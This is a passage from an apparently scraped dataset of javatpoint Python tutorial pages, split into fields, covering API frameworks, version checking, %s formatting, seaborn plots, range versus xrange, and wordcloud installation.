Let's understand the following example.||||||limit_denominator(max_denominator=1000000) - It is used to find the approximation to given floating-point number. It returns the closet Fraction to self that has denominator at max_denominator. Let's understand the following example.|||""]"
242,['Popular Python Framework to Build API'],"[""Python is a most versatile programming language, and it allows us to perform complex tasks easily. In this tutorial, we will learn about the top Python framework widely used to build APIs. Before that, let's understand what API is and how it works.""]","['https://www.javatpoint.com/how-to-check-python-version', 'https://www.javatpoint.com/fraction-module-in-python', 'https://www.javatpoint.com/how-to-check-python-version', 'https://www.javatpoint.com/fraction-module-in-python', 'https://www.javatpoint.com/how-to-check-python-version']",[],[],"['What is API?', 'Top Frameworks to Build API', 'Conclusion']","['1. Django Rest Framework', '2. Flask REST Framework', '3. Falcon', '4. Pyramid', '5. FastAPI', '6. Eve', '7. CherryPy', '8. Cornice']",[],"['There are number of frameworks available but not all of them are meant for API. Below are some popular and important frameworks.', 'Django REST Features -', 'With the help of this framework, a developer can easily create the API, and many new features are adding to the Flask REST framework.', 'Flask RESTful Features -', 'Falcon Features -', 'Pyramid Features - ', 'Drawbacks -', 'Eve Features -', 'CherryPy Features -', 'Cornice Features']","['API is an acronym of the Application Programming Interface. It is a software intermediary that enables communication between the two applications. For example - We purchase the product from an online shopping portal and make payment using the API.', 'Here the waiter API comes in. The waiter will take your request to the Kitchen - the system will prepare the food. Then the waiter will deliver the food in a back response.', 'It provides the simplest way to create rich APIs. We can install the Django REST framework using the PIP command. To work with the Django REST framework, the Python version should be 3.5+, and a Django must be installed in the system.', 'Flask REST framework is the same as the Django REST framework. It is used to build API quickly. Flask is known for doing a lightweight project, and it requires a few lines of code to build API.', 'Falcon is a high-performance web framework that is used to build large-scale application backbends and microservices. We can develop the API using an object-oriented and class-based interface. It is highly compatible with multiple servers.', 'Kurt Griffiths developed Falcon in 2013. Through, there are extensive community provides valuable input. It follows HTTP and REST architecture style that is used to create clear designs. This framework is concerned with quality control.', 'The cornice is a REST framework for Pyramid, which offers a helper to build REST web services. It takes care of HTTP specifications in an automated way where possible.', 'This tutorial included most used and popular frameworks that widely used to create APIs. Each framework has merits and demits and user can choose any of them according to their requirements.']","['Let\'s take a real-world example, suppose you are in a restaurant with the menu and ready to give an order. The Kitchen is like a ""system"" that will prepare your ordered food, how the Kitchen knows what you have ordered or how you can communicate with the chef to make your order.', 'Django REST is a powerful Django-based framework that the developer uses to create the APIs. In Django REST, REST stands for Representational State Transfer. It is used for web-based architecture for data communication. The HTTP request is used to call between machines. There are four standard methods used in the Django REST framework - GET, PUT, POST, and DELETE.', ""Pyramid is a hybrid web framework that acts as a bridge between Django and Flask. It can be used in both types of projects, neither too big nor too small. Django follows the Pyramid's progress on social media via Twitter and a Google Group. Pyramid's developers are continuously working towards its development; they released the tenth release since its debut. The current version of Pyramid is 1.10."", 'As the name suggests, FastAPI is the fastest and high-performing Python framework for building APIs. This framework can develop API 200 to 300% times faster. Its community is growing significantly. It is based on the ASGI, which is majorly used for building asynchronous web applications.', 'Eve framework is built on the top of Flask and Cerberus. It makes the API development simple and fast. It can create the REST web services effortlessly, which are customizable. Eve is generally used for the mid-sized project. Nicola Iarocci developed this framework in early 2013, and it has been updated 33 times since its debut.', 'Cherry is a minimalist web framework, and it is object-oriented and HTTP/1.1 compliant. The primary aim of CherryPy is to provide speedy development. It shrinks all the source codebases. It was developed by Remi Delon and released in 2002. Now, it is maintained by the CherryPy community. CherryPy has the mailing list. Leading video streaming company Netflix use CherryPy to build block for select projects.']",[],[],[],"[""|||Huge active community across the world.|||It is trusted by the organization such as Red Hat, Mozilla, and Heroku.|||It also provides the support of testing, debugging and caching.|||Automatic support for the URL routing for Django.|||It takes less code to build a complex API.||||||There are vast numbers of default tools that make it difficult to learn for the newbies.|||The new programs may run into the problem while packaging components due to a lack of proper guidance.||||||Flask is very lightweight framework and easy to install.|||It provides the default security for the threats like injection attacks, data integrity checks, etc.|||Offers the facility to add the custom fields and input based on the data type.|||It comes with the representation() decorator that support other representations as XML, CSV, HTML.|||The marsal_with() decorator is used for data formatting.||||||It can't be used in the larger MVC projects.|||However, the Flask is highly flexible; the early customization time can delay expansion and production.||||||It is lightweight and requires minimal setup.|||It provides rapid development.|||Integrated with NoSQL |||Comes with a build-in server and debugger for the development.|||Provides fast performance.||||||It is not suitable for HTML pages.|||Lack a built-in web server.|||Its documentation is less comprehensive than the other frameworks like django and flask.||||||Pyramid is used to file building, thus packaging in foolproof manner. It provides a safety net, especially for newcomers.|||It supports all versions of Python.|||It allows developers robust API, URL mapping, and high extensibility via add ons.|||Users can create a fairly sizeable project template.|||Pyramid comes with the bootstrapping tool called pcreate which compatible with numerous templates based on SQLAlchemy and ZODB.||||||Its template syntax can be relatively complicated.|||XHTML structuring can seem foreign and complex, migrating from Django.||||||Interactive API documentation|||Minimize the duplication of code.|||It is highly secure and built-in authentication.|||Unlimited support for plugins.|||There is intuitive editor support (VSCode/PyCharm) with auto completion.||||||It takes lot of time in the request validation.|||Crowded main file.|||No singleton in Dependency Injection.||||||By default, it supports filtering, sorting, resource pagination, and HATEOAS.|||It supports the full range of CRUD operations.|||Supports CORS, Cross-Origin Resource Sharing.|||It comes with advanced features such as SQL Databases, MongoDB, ElasticSearch, and Neo4js.||||||It is suitable for mid-level projects; it can't handle the large project.|||It takes time to hunt down the suitable extension.||||||Object-oriented programming cuts off the development time and also the codebase size.|||It comes with the built-in tools for authentication, static content, caching, and session.|||It can server both dynamic and user-dependent content as well.|||It provides the built-in support for JSON.||||||Sessions may not be enabled by default.|||User with permission can access any file, if page handlers are not written properly.||||||It provides three fields in messages - sender, content, color, (red or black).|||Adding a message is done by authentication.|||One path in cornice is equal to one service.|||Supports URL prefixing for all your routes.||||||Single channel is available for messages.|||If a user with the same name is already registered, he/she cannot register.|||All messages and users stored in the memory.|||""]"
243,['How to Check Python version'],"['The Python interpreter is commercially used throughout many industries for source coding, computer programming, and code testing. It takes the commands from the user and executes them after interpreting them. Hence, it becomes very important to know about the version of Python interpreter that we are currently using.']","['https://www.javatpoint.com/python-s-string-formatting', 'https://www.javatpoint.com/popular-python-framework-to-build-api', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/python-s-string-formatting', 'https://www.javatpoint.com/popular-python-framework-to-build-api', 'https://www.javatpoint.com/python-s-string-formatting']","['https://static.javatpoint.com/python/images/how-to-check-python-version.png', 'https://static.javatpoint.com/python/images/how-to-check-python-version2.png']",[],"[""Benefits of checking Python interpreter's version:"", 'Checking the Version of the Python interpreter']","['Method 1: Using python_version() function:', 'Method 2: Using python -V command:', 'Method 3: Using sys.version method:']","[""Note: The latest version of the Python interpreter as of now is '3.9.6' with a stable version.""]","['Following are some highlighted benefits of checking the version of Python interpreter we are using:', 'Following are the methods for checking the version of the Python interpreter that we are going to learn in this tutorial:', ""Let's understand that how we can use these methods in Python as well as in the command prompt terminal to check the Python interpreter's version."", 'Look at the following program:', 'Explanation -', ""As we can see in the above output, we are using the '3.9.0' version of the Python interpreter."", 'Step 1: Open the cmd terminal shell of the system.', ""Step 2: Write 'python' and press the enter key to enter into the Python shell."", 'Step 3: Now, write the above code line by line inside the terminal and then press the enter key.', 'The terminal will show the version of the interpreter as the output of the code as following:', 'In this method, we only have to follow the following two steps:', 'Step 1: Open the terminal shell present in our device.', 'Step 2: Write the following command in the shell and press enter:', 'Now, we will get the version of the Python interpreter we are using in the string format.', 'Look at the following program:']","['We can also use this function in the command prompt terminal and check the version of the interpreter. For using the python_version() function in the terminal, we have to adhere to the following steps:', 'So, as we can see in the output that we have got the version of the interpreter we are using in the string format, we have also got the tag and released date for the interpreter version in this sys.version method.']","[""As we know that it is the interpreter which takes the code from the user and executes it line by line. Sometimes, suppose we have an older version of the Python interpreter. In that case, it makes the command doesn't execute appropriately because of the older version of the interpreter and its incompatibility with the new functions used in the command."", 'As we all know that Python is a programming language that comes with a regular update that adds some new features and functions with it; therefore, as a user, we also have to regularly update our Python interpreter with the latest released version of it.', 'In this section, we will learn about the methods by which we can quickly check the version of the Python interpreter we are using. We can even check the Python interpreter version using a Python program. We will also use the command prompt method to check the Python interpreter version we are using.', ""To use this function for checking the version of the Python interpreter, we first have to import the platform library. The python_version() function always returns the version of an interpreter in the string format. To better understand about working of this, let's use this in our Python program."", ""Using the 'python -V' command is considered the simplest and easiest method for checking the version of the Python interpreter we are using. It is an inbuilt command of the command prompt shell, and this method is specially built for the command prompt shell for checking the Python version."", 'To use sys.version method for checking the version of the Python interpreter, we first have to import the platform library. Like the python_version() function method, we can use this method both in command prompt shell as well as a Python program in Python shell. Here, we will only use this method as the Python program and get the version of the Python interpreter as the output of the program.']","['# Importing platform library', 'from platform import python_version', '# Getting Python interpreter version as a result', 'print(""Current Version of Python interpreter we are using-"", python_version())', ""'python -V'"", '# Importing sys library', 'import sys', '# Getting interpreter version as a result', 'print(""Current Version of Python interpreter we are using-"" sys.version)']","['Current Version of Python interpreter we are using- 3.9.0', 'Current Version of Python interpreter we are using- 3.9.0 (tags/v3.9.0:9cf6752, Oct  5 2020, 15:34:40) [MSC v.1927 64 bit (AMD64)]']",[],['|||We will know if we are missing any update for the interpreter or the updates in function comes with it.|||We can find out if the syntax error is producing because of an older version of the Python interpreter.|||We can have access to all the latest functions and updates that come with the latest version of the Python interpreter.||||||With python_version() function|||With python -V command|||With sys.version method|||']
244,['Python %s - String Formatting'],"['In this tutorial, we will learn about how we can implement and use %s in our Python program. We will also learn the uses of %s in the strings.']","['https://www.javatpoint.com/python-seaborn-library', 'https://www.javatpoint.com/how-to-check-python-version', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-seaborn-library', 'https://www.javatpoint.com/how-to-check-python-version', 'https://www.javatpoint.com/python-seaborn-library']",[],[],"['%s in a string format in Python', 'Uses of %s operator in Python']","['1. Multiple %s in a string:', '2. Using %s for mapping string:', '3. Using %s for a list as a string:', '4. Order dictionary with %s:']","[""Note: But, if we don't give the same number of string variables after % operator, as the %s operator we have used, then the code will through a TypeError in the output like the following program:""]","['Basically, the % symbol is used with a large variety of data having many data types and configurations in Python.', 'The following Python code will explain the way by which we perform string formatting using %s operator:', 'We will discuss the following approaches of implementing %s:', 'Example: Look at the following code:', 'Explanation -', 'Example: 1', 'Example - 2']","['We put the % operator, where we have to specify the string. The numbers of values that we want to append into the given string should be equal to the numbers of %s operators that have been specified in the parentheses between the strings.', 'As we can see in the above code, we have declared a string variable, i.e., str, and appended it inside the given string in parenthesis. We appended the str string value using the %s operator.', 'In this section, we will discuss the highlighted uses of the %s operator. We will also learn the implementation of the %s operator by multiple approaches and how it is helpful to us.', 'We have appended multiple string variables (mkr1, mkr2, mkr3) inside a single string and printed the string. We have appended these variables by simply using the %s operator multiple times within the string.', 'We can define multiple string variables inside a dictionary data type variable. Then, we can call out these string variables by the order we want to, just by using the %s operator with the string variable name.']","['Talking about %s, it is specifically used to perform concatenation of two or more strings together in Python. The %s allow us to format or place a string or numerical value within a given string. In simple language, the %s in Python is used to incorporate a given string within another string. This operator automatically provides type conversion of a given value to string data type.', ""We can use the %s operator to append the given string variable inside a string by putting it where we want to add the value. Python will simply add the string variables where we have used the %s operator in the string. Let's go through an example to understand it."", 'We can also use the %s operator for mapping the string within the given program. We can map multiple string variables into a single string by simply using %s operators multiple times. However, when we want to add multiple string variables in a single string, we have to match the number of occurrences of %s in the string with the number of strings to replace it. We have to add that number of strings after the % operator.', ""With the help of the %s operator, we can also map a given list data type variable with the string variables to form a single string. We have to follow the same set of instructions that we follow while mapping string variables. Let's go through an example to understand it.""]","['# Define a string value', 'str = ""JavaTpoint!""', '# using %s to appending string', 'print(""Hello Python developers! Welcome to, %s!"" % str)', '# Declaring multiple string values', 'mkr1 = ""developers""', 'mkr2 = ""JavaTpoint""', 'mkr3 = ""day""', '# Appending multiple string values inside a single string', 'print(""Hello Python %s, Welcome to the %s! We hope you are having a good %s."" % (mkr1, mkr2, mkr3))', '# Declaring multiple string variables', 'mkr1 = ""Hey""', 'mkr2 = ""Python""', 'mkr3 = ""Developers""', 'mkr4 = ""Welcome""', 'mkr5 = ""to""', 'mkr6 = ""JavaTpoint""', '# Mapping multiple string variables into a single string', 'ResultantStr = ""%s %s %s %s %s %s"" % (mkr1, mkr2, mkr3, mkr4, mkr5, mkr6)', '# Printing result in output', 'print(""Resultant mapped string using \'%s\' operator: "")', 'print(ResultantStr)', '# Declaring multiple string variables', 'mkr1 = ""Hey""', 'mkr2 = ""Python""', 'mkr3 = ""Developers""', 'mkr4 = ""Welcome""', 'mkr5 = ""to""', 'mkr6 = ""JavaTpoint""', '# Not giving equal number of variables after % operator', 'ResultantStr = ""%s %s %s %s %s %s"" % (mkr1, mkr2, mkr4, mkr5, mkr6)', '# Printing result in output', 'print(""Resultant mapped string using \'%s\' operator: "")', 'print(ResultantStr)', '# Declaring multiple string variables', 'mkr1 = ""Hey""', 'mkr2 = ""Python""', 'mkr3 = ""Developers""', 'mkr4 = ""Welcome""', 'mkr5 = ""to""', 'mkr6 = ""JavaTpoint""', '# Declaring a list variable also', 'AList = [""Java"", ""Python"", ""C++"", ""HTML"", ""JavaScript""]', '# Mapping string variables with list variable into a single string', 'ResultantStr = ""%s %s %s %s %s %s, %s"" % (mkr1, mkr2, mkr3, mkr4, mkr5, mkr6, AList)', '# Printing result in output', 'print(""Resultant mapped string with list variable in it: "")', 'print(ResultantStr)', '# Declaring a dict variable with multiple string variable in it', ""ADict = {'mkr1': 'at',"", ""'mkr2': 'JavaTpoint',"", ""'mkr3': 'Learning',"", ""'mkr4':'operator',"", ""'mkr5':'concept',"", ""'mkr6': '%s'}"", '# Mapping a string with string variables in dictionary', 'ResultantStr = ""%(mkr3)s %(mkr6)s %(mkr4)s %(mkr5)s %(mkr1)s %(mkr2)s"" % ADict', '# Printing result in output', 'print(""Resultant mapped string with ordered variable from dictionary: "")', 'print(ResultantStr)']","['Hello Python developers! Welcome to, JavaTpoint!', 'Hello Python developers, Welcome to the JavaTpoint! We hope you are having a good day.', ""Resultant mapped string using '%s' operator:"", 'Hey Python Developers Welcome to JavaTpoint', 'Traceback (most recent call last):', 'File ""C:\\Users\\Manish\\Downloads\\code.py"", line 9, in', 'ResultantStr = ""%s %s %s %s %s %s"" % (mkr1, mkr2, mkr4, mkr5, mkr6)', 'TypeError: not enough arguments for format string', 'Resultant mapped string with list variable in it:', ""Hey Python Developers Welcome to JavaTpoint, ['Java', 'Python', 'C++', 'HTML', 'JavaScript']"", 'Resultant mapped string with ordered variable from dictionary:', 'Learning %s operator concept at JavaTpoint']",[],['|||Multiple %s in a string|||Using %s for mapping string|||Using %s for a list as a string|||Order Dictionary with %s|||']
245,['Python seaborn Library'],['Seaborn is one of an amazing library for visualization of the graphical statistical plotting in Python. Seaborn provides many color palettes and defaults beautiful styles to make the creation of many statistical plots in Python more attractive.'],"['https://www.javatpoint.com/countplot-in-python', 'https://www.javatpoint.com/python-s-string-formatting', 'https://www.javatpoint.com/https://www.javatpoint.com/matplotlib', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/countplot-in-python', 'https://www.javatpoint.com/python-s-string-formatting', 'https://www.javatpoint.com/countplot-in-python']","['https://static.javatpoint.com/python/images/python-seaborn-library.png', 'https://static.javatpoint.com/python/images/python-seaborn-library2.png', 'https://static.javatpoint.com/python/images/python-seaborn-library3.png']",[],"['Objective of Python Seaborn library', ""Categories of Plots in Python's seaborn library"", 'Installation of seaborn library for Python', 'Plotting Chart Using seaborn Library']","['1. Line plot:', '2. Dist plot:', '3. Lmplot:']",[],"['In the seaborn library, the plot that we create is divided into the following various categories:', 'Required dependencies or prerequisites for the seaborn library:', 'We must have,', 'Now, we will learn about some basic plots examples that we can plot in Python using the seaborn library.']","['Seaborn library aims to make a more attractive visualization of the central part of understanding and exploring data. It is built on the core of the matplotlib library and also provides dataset-oriented APIs.', ""Seaborn is also closely integrated with the Panda's data structures, and with this, we can easily jump between the various different visual representations for a given variable to better understand the provided dataset."", 'Here, we will learn how we can install the seaborn library for Python. After installing the seaborn library, we can import it into our Python program and use it in Python.', 'The seaborn line plot is one of the most basic plots presents in the seaborn library. We use the seaborn line plot mainly to visualize the given data in some time-series form, i.e., in a continuous manner with respect to time.', 'Explanation: In the above code, after setting the dataset as fmri type and setting style of a line plot, we use the lineplot() function to draw the line plot in the output.', 'We use the seaborn dist plots to plot histograms with the given variables and data as a result. We can plot histograms with some other variations such as rugplot and kdeplot using a dist plot.']","['Plots are generally used to make visualization of the relationships between the given variables. These variables can either be a category like a group, division, or class or can be completely numerical variables. There are various different categories of plots that we can create using the seaborn library.', 'The Lmplot is another one of the basic plots in the seaborn library. The Lmplot shows a line that represents a linear regression model with the data points on the given two-dimensional (2-D) space. In this 2-D space, we can set x and y variables as the vertical and horizontal labels, respectively.']","['pip install seaborn', '# Importing seaborn library in program', 'import seaborn as sns', '# Importing mataplotlib library to show graph in output', 'import matplotlib.pyplot as plt', '# Setting style with set() function', 'sns.set(style=""dark"")', '# Using dataset() function to declare data type', 'FMR = sns.load_dataset(""fmri"")', '# Plotting various responses for different\\', '# Regions and events', 'sns.lineplot(x=""timepoint"",', 'y=""signal"",', 'hue=""region"",', 'style=""event"",', 'data=FMR) # using lineplot() function to create line plot', 'plt.show() # using show() function', '# importing numpy as np library module', 'import numpy as np', '# Importing seaborn library in program', 'import seaborn as sns', '# Importing mataplotlib library to show graph in output', 'import matplotlib.pyplot as plt', '# Selecting style for boxplot with set() function', 'sns.set(style=""white"")', '# Generate a random univariate type distribution', 'ru = np.random.RandomState(10)', 'd = ru.normal(size=100)', '# Plotting a simple histogram with kdeplot variation', 'sns.histplot(d, kde=True, color=""m"")', 'plot = sns.histplot(d, kde=True, color=""m"")', 'print(plot)', 'plt.show() # using show() function', '# Importing seaborn library in program', 'import seaborn as sns', '# Importing matplotlib library to show graph in output', 'import matplotlib.pyplot as plt', '# Using set() function to set style', 'sns.set(style=""ticks"")', '# Using dataset() function', 'ds = sns.load_dataset(""anscombe"")', '# Showing results in the form of linear regression', 'sns.lmplot(x=""x"", y=""y"", data=ds)', 'plot = sns.lmplot(x=""x"", y=""y"", data=ds)', 'print(plot)', 'plt.show() # using show() function']",['<seaborn.axisgrid.FacetGrid object at 0x000002182DC89070>'],[],"['|||Distribution plots: This type of plot is used for examining both types of distributions, i.e., univariate and bivariate distribution.|||Relational plots: This type of plot is used to understand the relation between the two given variables.|||Regression plots: Regression plots in the seaborn library are primarily intended to add an additional visual guide that will help to emphasize dataset patterns during the analysis of exploratory data.|||Categorical plots: The categorical plots are used to deals with categories of variables and how we can visualize them.|||Multi-plot grids: The multi-plot grids are also a type of plot that is a useful approach is to draw multiple instances for the same plot with different subsets of a single dataset.|||Matrix plots: The matrix plots are a type of arrays of the scatterplots.||||||Python installed with the latest version (3.6+).|||Numpy must be installed with version 1.13.3 or higher.|||SciPy must be installed with 1.0.1 or higher versions.|||Must have panda library with 0.22.0 or higher versions.|||statsmodel library must be installed with version 0.8.0 or higher.|||And should have matplotlib installed with 2.1.2 or higher versions.|||']"
246,['Countplot in Python'],"['In this article, we will discuss how we can create a countplot using the seaborn library and how the different parameters can be used to infer results from the features of our dataset.']","['https://www.javatpoint.com/range-vs-xrange-python', 'https://www.javatpoint.com/python-seaborn-library', 'https://www.javatpoint.com/range-vs-xrange-python', 'https://www.javatpoint.com/python-seaborn-library', 'https://www.javatpoint.com/range-vs-xrange-python']","['https://static.javatpoint.com/python/images/countplot-in-python.png', 'https://static.javatpoint.com/python/images/countplot-in-python2.png', 'https://static.javatpoint.com/python/images/countplot-in-python3.png', 'https://static.javatpoint.com/python/images/countplot-in-python4.png', 'https://static.javatpoint.com/python/images/countplot-in-python5.png', 'https://static.javatpoint.com/python/images/countplot-in-python6.png', 'https://static.javatpoint.com/python/images/countplot-in-python7.png']",[],"['Seaborn library', 'Countplot']","['Parameters-', '1. Value counts for a single variable', '2. Representing two categorical variables using hue parameter', '3. Creating Horizontal Plots', '4. Using color palettes', ""5. Using a parameter 'color'"", ""6. Using the parameter 'saturation'""]",[],"['The seaborn library is widely used among data analysts, the galaxy of plots it contains provides the best possible representation of our data.', 'The seaborn library can be imported into our working environment using-', 'Let us now discuss why do we use countplot and what is the significance of its parameters.', 'The countplot is used to represent the occurrence(counts) of the observation present in the categorical variable.', 'It uses the concept of a bar chart for the visual depiction.', 'The following parameters are specified when we create a countplot, let us get a brief idea of them-', 'Now let us see what are the different ways of representing our attributes.', ""In the first example, we will create a countplot for a single variable. We have taken the dataset 'tips' to implement the same."", 'In the next example, we will use the hue parameter and create a countplot.', 'The following program illustrates the same-', 'In the next example, we will consider the y axis and create a horizontal countplot.', 'The following program illustrates the same-', 'Let us now have a look at how color palettes can enhance the presentation of our data.', 'In the next example, we will use the parameter ""palette"".', 'The following program illustrates the same-', 'In the next example, we will use the parameter color and let us see how does it works?', 'The following program illustrates the same-', ""Now we will use the parameter 'saturation' and see how does it impact the representation of our data."", 'The following program illustrates the same-', 'And finally in the last example we will use the parameters linewidth and edgecolor.']",[],[],"['import seaborn as sns', 'import matplotlib.pyplot as plt', 'import seaborn as sns', 'import pandas as pd', ""#loading the dataset 'tips'"", 'df=pd.read_csv(""/content/tips.csv"")', '#plotting the graph', ""sns.countplot(x='sex',data=df)"", 'plt.show()', 'import matplotlib.pyplot as plt', 'import seaborn as sns', 'import pandas as pd', ""#loading the dataset 'tips'"", 'df=pd.read_csv(""/content/tips.csv"")', '#plotting the graph', ""sns.countplot(x='sex',hue='smoker',data=df)"", 'plt.show()', 'import matplotlib.pyplot as plt', 'import seaborn as sns', 'import pandas as pd', ""#loading the dataset 'tips'"", 'df=pd.read_csv(""/content/tips.csv"")', '#plotting the graph', ""sns.countplot(y='sex',hue='smoker',data=df)"", 'plt.show()', 'import matplotlib.pyplot as plt', 'import seaborn as sns', 'import pandas as pd', ""#loading the dataset 'tips'"", 'df=pd.read_csv(""/content/tips.csv"")', '#plotting the graph', ""sns.countplot(x='sex', data=df, palette='Set1')"", 'plt.show()', 'import matplotlib.pyplot as plt', 'import seaborn as sns', 'import pandas as pd', ""#loading the dataset 'train'"", 'df=pd.read_csv(""/content/train.csv"")', '#plotting the graph', ""sns.countplot(x='Pclass',hue='Sex', data=df, color='green')"", 'plt.show()', 'import matplotlib.pyplot as plt', 'import seaborn as sns', 'import pandas as pd', ""#loading the dataset 'train'"", 'df=pd.read_csv(""/content/train.csv"")', '#plotting the graph', ""sns.countplot(x='Pclass',data=df, color='green', saturation=0.1)"", 'plt.show()', 'import matplotlib.pyplot as plt', 'import seaborn as sns', 'import pandas as pd', ""#loading the dataset 'train'"", 'df=pd.read_csv(""/content/train.csv"")', 'sns.countplot(x=\'Sex\', data=df, color=""green"", facecolor=(0,0,0,0), linewidth=5, edgecolor=sns.color_palette(""BrBG"",2))', 'plt.show()']",[],[],"['|||Using matplotlib.axes.Axes.bar()|||&&&|||x and y- This parameter specifies the data we refer to for representation and then observes the highlighted patterns.|||color- This parameter specifies the color that can give a good appearance to our plot.|||palette- It takes the value of the palette. It is mostly used to show the hue variable.|||hue- This parameter specifies the column name.|||data- This parameter specifies the data frame we would like to take for the representation. For instance, data can be an array.|||dodge- This parameter is an optional one and it accepts a Boolean value as input.|||saturation- This parameter accepts a float value. A variation in the intensity of colors can be observed when we specify this.|||hue_order- The parameter hue_order takes strings as an input.|||kwargs- The parameter kwargs specifies the key and value mappings.|||ax- The parameter ax is an optional one and is used to take axes on which plots are created.|||orient- The parameter orient is an optional one and tells the orientation of the plot that we need, horizontal or vertical.|||']"
247,['range() Vs. Xrange() Python'],"['In this article, we will discuss what is range() and xrange() function, how they are used in Python, and what are the essential features of each.']","['https://www.javatpoint.com/wordcloud-package-in-python', 'https://www.javatpoint.com/countplot-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/wordcloud-package-in-python', 'https://www.javatpoint.com/countplot-in-python', 'https://www.javatpoint.com/wordcloud-package-in-python']","['https://static.javatpoint.com/python/images/range-vs-xrange-python.png', 'https://static.javatpoint.com/python/images/range-vs-xrange-python2.png', 'https://static.javatpoint.com/python/images/range-vs-xrange-python3.png', 'https://static.javatpoint.com/python/images/range-vs-xrange-python4.png', 'https://static.javatpoint.com/python/images/range-vs-xrange-python5.png', 'https://static.javatpoint.com/python/images/range-vs-xrange-python6.png']",[],"['The range() Function-', 'The Xrange() Function', 'Comparison between Range() AND Xrange()']",[],[],"['First, we will have a look at what is the range function and discuss some programs that involve its usage.', 'Similarly, then we will understand what is xrange function and get an idea of it with the help of some programs.', 'At last, we will look at the features of each.', 'The following program illustrates the same-', 'After this, we will also check that what type does it return.', 'The following program illustrates the same-', 'Example - 2', 'The following program illustrates the same-', 'Example - 3', 'start-The value from which we would like to start displaying the elements.', 'stop- The value on which we would like to stop displaying the elements.', 'step- The step value refers to the value that indicates the kind of sequence we expect in our results. By default, the value of the step is 0.', 'The following program illustrates the same-', 'Example - 4', 'The following program illustrates the same-', 'Example - 4', 'The xrange() function has the same purpose and returns a generator object but was used in the versions that came before Python 3.', 'The syntax of xrange is the same as range() which means in xrange also we have to specify start, stop and step.', 'If you are using Python 3 and execute a program using xrange then it will generate an error since this version onwards range() is used.', ""Let's see what happens when we run the following program in Python-"", 'Here we will compare both based on consumption of memory, return type, speed and operations-']","['The functions available in Python can be used in multiple parts of our program since they reduce the size of code and add a lot of value to the readability of code.', 'In the following example, we will print the first 7 numbers starting from 0 to 6. We have specified the value in the range function for the same and provided a space in the end parameter so that it prints the values with space.', ""In the next example, we have defined a list that contains 10 elements. We have specified the value as the length of our list 'a' in the range function for the same and provided a space in the end parameter so that it prints the values with a space."", 'In the next example, we will print the values in the reverse order that lies in the range of 0 to 10. We have specified the value in the range function in the format of start, stop and end. Let us have a look at each one of denote-']","['In the second example, we will do the same thing again, that is, print the first 7 numbers starting from 0 to 6. We have specified the value in the range function for the same and provided a space in the end parameter so that it prints the values with space.', 'In the next example, we will print the numbers starting from 21 to 31 but this time using the reversed method of Python. We have specified the value in the range function for the same and provided a space in the end parameter so that it prints the values with space.']","['for i in range(7):', 'print(i, end="" "")', 'for i in range(7):', 'print(i,end="" "")', 'print(type(range(7)))', 'a=[1,2,3,4,5,6,7,8,9,10]', 'for i in range(len(a)):', 'print(a[i],end="" "")', 'for i in range(10,-1,-1):', 'print(i)', 'for i in reversed(range(21,31)):', 'print(i,end="" "")', 'for i in range(1,10,2):', 'print(i)', 'for j in xrange(10,20,2):', 'print(j)']",[],"['Parameters|||Range()|||Xrange()&&&1. Consumption of Memory|||Since range() returns a list of elements, it takes more memory.|||In comparison to range(), it takes less memory.&&&2. Return type|||It returns a list of integers.|||It returns a generator object.&&&3. Speed|||Its execution speed is slower.|||Its execution speed is faster.&&&4. Operations|||Since it returns a list, all kinds of arithmetic operations can be performed.|||Such operations cannot be performed on xrange().']",[]
248,['Wordcloud Package in Python'],['Wordcloud package helps us to know the frequency of a word in textual content using visualization.'],"['https://www.javatpoint.com/convert-dataframe-into-list', 'https://www.javatpoint.com/range-vs-xrange-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/convert-dataframe-into-list', 'https://www.javatpoint.com/range-vs-xrange-python', 'https://www.javatpoint.com/convert-dataframe-into-list']","['https://static.javatpoint.com/python/images/wordcloud-package-in-python.png', 'https://static.javatpoint.com/python/images/wordcloud-package-in-python2.png', 'https://static.javatpoint.com/python/images/wordcloud-package-in-python3.png']",[],"['Installation of Matplotlib', 'Verifying the Installation', 'Installation of Wordcloud']","['Installation of Pandas', '1. Using Command Prompt', '2. Using Anaconda Navigator']",[],"['To implement this we need to install some packages first, like pandas, matplotlib, and Wordcloud.', 'Let us have a look at the steps of the installation of each-', 'The pd refers to the process of aliasing with the help of which data frames can be created and it makes the readability of code easier.', 'Pandas can be installed using two ways-', ""First, let's see how we can work on our objective using command prompt."", 'The same command can be used in Linux in the terminal to install pandas in our system.', 'The second way to install pandas in our system is using Anaconda Navigator', 'Matplotlib can be installed by following the given steps-', 'Matplotlib can be installed in our system by using the given command in the Command Prompt-', 'We can install matplotlib using Anaconda by typing the following command in the Anaconda Prompt-', 'We can verify that matplotlib has been successfully installed in our system or not by typing the given program in the terminal-', 'As discussed earlier, it gives us an idea of the most occurred words in a text with the help of a visual.', 'Let us have a look at the steps of installation-', 'WordCloud can be installed by following the given steps-', 'WordCloud can be installed in our system by using the given command in the command prompt.', 'We can install wordcloud using Anaconda by typing the following command in the Anaconda Prompt.', 'Now let us have a look at the simple program that shows how wordcloud can be used in Python.', 'We have taken this piece of text from a website and save as sunflowers1.txt file.', 'sunflowers1.txt', 'Code Implementation']","['Pandas is a great tool to implement data analysis and visualizations in Jupyter Notebook. It can be imported into our source code in the following way-', 'Matplotlib is a vast and interesting library for people who are enthusiastic about inferring results from the data and there are scatterplots, histograms, boxplots, and a lot more which makes it easy for us to comprehend.']",[],"['import pandas as pd', 'pip install matplotlib', 'conda install matplotlib', 'import matplotlib', 'matplotlib.__version__', 'pip install wordcloud', 'conda install -c conda-forge wordcloud', '""Sunflowers are heliotropic, which means that they turn their flowers to follow the movement of the Sun across the sky east to west, and then returns at night to face the east, ready again for the morning sun. Heliotropism happens during the earlier stages before the flower grows heavy with seeds.', 'There are tons of varieties of sunflowers available today, so there\'s bound to be one that fits your garden. Choose between those with branching stems or single stems, those that produce ample pollen for pollinators or are pollen-free (best for bouquets), those that stay small or tower above the rest of the garden, or those that produce edible seeds! ""', 'import re', 'import matplotlib.pyplot as plt', 'from wordcloud import WordCloud, STOPWORDS', 'text = 